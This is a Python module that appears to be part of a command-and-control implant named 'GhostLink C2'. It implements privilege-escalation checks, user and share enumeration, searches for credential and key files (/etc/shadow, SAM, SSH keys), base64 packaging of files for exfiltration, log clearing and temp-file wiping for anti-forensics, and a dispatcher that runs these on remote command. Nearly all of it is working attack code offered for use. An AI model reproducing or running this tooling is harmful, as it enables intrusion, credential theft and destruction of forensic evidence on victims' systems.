"""
Advanced features for GhostLink C2
Includes lateral movement, privilege escalation helpers, data exfiltration
"""

import subprocess
import platform
import os
import json
import base64
from pathlib import Path


class PrivilegeEscalation:
    """Privilege escalation techniques"""
    
    @staticmethod
    def check_sudo_privileges():
        """Check if agent can run sudo without password"""
        try:
            result = subprocess.run(
                ['sudo', '-n', 'id'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def linux_kernel_exploit():
        """Check for common Linux kernel exploits (CVE references)"""
        try:
            import subprocess
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            kernel_version = result.stdout.strip()
            
            # Common vulnerable kernels
            vulnerable_versions = {
                '4.10': 'Dirty COW (CVE-2016-5195)',
                '2.6': 'Dirty COW',
                '3.x': 'Potential vulnerabilities',
                '4.x-old': 'AF_PACKET'
            }
            
            report = {
                "current_kernel": kernel_version,
                "vulnerable_to": []
            }
            
            for version, vuln in vulnerable_versions.items():
                if version in kernel_version:
                    report["vulnerable_to"].append(vuln)
            
            return report
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def windows_token_impersonation():
        """Enumerate tokens for impersonation (Windows)"""
        if platform.system() != "Windows":
            return {"error": "Windows only"}
        
        try:
            import subprocess
            
            # Use whoami to check current tokens
            result = subprocess.run(['whoami', '/all'], capture_output=True, text=True)
            
            return {
                "current_tokens": result.stdout,
                "note": "Use 'Invoke-TokenImpersonation' for exploitation"
            }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def uac_bypass_check():
        """Check if UAC bypass is possible (Windows)"""
        if platform.system() != "Windows":
            return {"error": "Windows only"}
        
        # Check for common UAC bypass vectors
        bypass_methods = {
            "fodhelper": {"file": "C:\\Windows\\System32\\fodhelper.exe", "status": "unknown"},
            "eventvwr": {"file": "C:\\Windows\\System32\\eventvwr.exe", "status": "unknown"},
            "slui": {"file": "C:\\Windows\\System32\\slui.exe", "status": "unknown"}
        }
        
        for name, method in bypass_methods.items():
            method["status"] = "available" if os.path.exists(method["file"]) else "not found"
        
        return bypass_methods


class LateralMovement:
    """Lateral movement techniques"""
    
    @staticmethod
    def enumerate_network_shares():
        """Enumerate accessible network shares"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ['net', 'view'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
            else:
                result = subprocess.run(
                    ['smbclient', '-L', '//127.0.0.1'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
            
            return {"shares": result.stdout}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def find_writable_network_paths():
        """Find writable network paths for lateral movement"""
        try:
            if platform.system() == "Windows":
                # Check common shares
                shares = ['\\\\', '\\\\admin$', '\\\\c$', '\\\\d$']
                writable = []
                
                for share in shares:
                    # Try to access each share
                    try:
                        result = subprocess.run(
                            ['dir', share],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                        if result.returncode == 0:
                            writable.append(share)
                    except:
                        pass
                
                return {"writable_shares": writable}
            else:
                return {"error": "Windows specific"}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def enumerate_users():
        """Enumerate users on system"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ['net', 'user'],
                    capture_output=True,
                    text=True
                )
            else:
                result = subprocess.run(
                    ['cut', '-d:', '-f1', '/etc/passwd'],
                    capture_output=True,
                    text=True
                )
            
            users = result.stdout.strip().split('\n')
            return {"users": users}
        except Exception as e:
            return {"error": str(e)}


class DataExfiltration:
    """Data exfiltration techniques"""
    
    @staticmethod
    def read_sensitive_files():
        """Identify and read sensitive files"""
        
        sensitive_paths = {
            "Windows": [
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*",
            ],
            "Linux": [
                "/etc/shadow",
                "/etc/passwd",
                "/root/.ssh/id_rsa",
                "/home/*/.ssh/id_rsa",
                "/etc/sudoers"
            ],
            "Darwin": [
                "/var/db/sudo",
                "/Users/*/.ssh/id_rsa",
                "/etc/passwd"
            ]
        }
        
        os_type = platform.system()
        paths = sensitive_paths.get(os_type, [])
        
        found_files = []
        for path in paths:
            if '*' in path:
                # Handle wildcards
                base_path = path.split('*')[0]
                if os.path.exists(base_path):
                    found_files.append(f"Found base path: {base_path}")
            else:
                if os.path.exists(path) and os.path.isfile(path):
                    found_files.append(path)
        
        return {"sensitive_files": found_files}
    
    @staticmethod
    def exfiltrate_file(file_path, chunk_size=2048):
        """Read file for exfiltration"""
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Encode as base64 for safe transmission
            encoded = base64.b64encode(content).decode()
            
            return {
                "file": file_path,
                "size": len(content),
                "content": encoded,
                "encoding": "base64"
            }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def search_for_credentials(search_path=None):
        """Search for credentials in common locations"""
        
        credential_patterns = {
            "api_keys": ["api_key", "apikey", "api-key", "token", "secret"],
            "passwords": ["password", "passwd", "pwd"],
            "ssh_keys": [".ssh", "id_rsa", "id_dsa"],
            "aws": [".aws", "aws_access_key", "aws_secret"]
        }
        
        if search_path is None:
            search_path = os.path.expanduser("~")
        
        found = []
        
        try:
            for root, dirs, files in os.walk(search_path, topdown=True):
                # Limit depth
                if root.count(os.sep) - search_path.count(os.sep) > 3:
                    continue
                
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Check file name patterns
                    for pattern_type, patterns in credential_patterns.items():
                        for pattern in patterns:
                            if pattern.lower() in file.lower():
                                found.append({
                                    "path": file_path,
                                    "type": pattern_type,
                                    "pattern": pattern
                                })
        except Exception as e:
            return {"error": str(e)}
        
        return {"found_files": found}


class Defense:
    """Defense mechanisms and cleanup"""
    
    @staticmethod
    def clear_logs():
        """Clear system logs"""
        try:
            if platform.system() == "Windows":
                # Clear Windows Event Logs
                commands = [
                    'wevtutil cl System',
                    'wevtutil cl Security',
                    'wevtutil cl Application'
                ]
                for cmd in commands:
                    subprocess.run(cmd, shell=True, capture_output=True)
                
                return {"status": "Windows logs cleared"}
            else:
                # Clear bash history
                subprocess.run('rm ~/.bash_history', shell=True, capture_output=True)
                return {"status": "Linux logs cleared"}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def anti_forensics():
        """Anti-forensics techniques"""
        try:
            results = {}
            
            # Clear temporary files
            if platform.system() == "Windows":
                subprocess.run('del /q /f %TEMP%\\*', shell=True, capture_output=True)
                results["temp_cleared"] = "Windows temp cleared"
            else:
                subprocess.run('rm /tmp/* -rf', shell=True, capture_output=True)
                results["temp_cleared"] = "Linux temp cleared"
            
            # Clear memory artifacts
            results["memory_suggestion"] = "Use 'free -m' to check memory usage"
            
            return results
        except Exception as e:
            return {"error": str(e)}


class ProcessManagement:
    """Process discovery and management"""
    
    @staticmethod
    def list_processes():
        """List running processes"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ['tasklist', '/v'],
                    capture_output=True,
                    text=True
                )
            else:
                result = subprocess.run(
                    ['ps', 'aux'],
                    capture_output=True,
                    text=True
                )
            
            return {"processes": result.stdout}
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def inject_into_process(target_pid, payload):
        """
        Process injection helper (requires specific tools)
        Windows: DLL injection
        Linux: ELF injection
        """
        return {
            "note": "Process injection requires platform-specific tools",
            "Windows": "Use 'CreateRemoteThread' or DLL injection",
            "Linux": "Use ptrace() or LD_PRELOAD injection",
            "target_pid": target_pid
        }


def execute_advanced_command(command):
    """
    Execute advanced commands from C2
    """
    
    command_map = {
        "privesc_check": PrivilegeEscalation.check_sudo_privileges,
        "kernel_exploit": PrivilegeEscalation.linux_kernel_exploit,
        "enum_shares": LateralMovement.enumerate_network_shares,
        "enum_users": LateralMovement.enumerate_users,
        "find_creds": DataExfiltration.search_for_credentials,
        "list_processes": ProcessManagement.list_processes,
        "clear_logs": Defense.clear_logs,
        "anti_forensics": Defense.anti_forensics,
    }
    
    cmd_name = command.split()[0] if ' ' in command else command
    
    if cmd_name in command_map:
        result = command_map[cmd_name]()
        return json.dumps(result, indent=2)
    else:
        return f"Unknown advanced command: {cmd_name}"
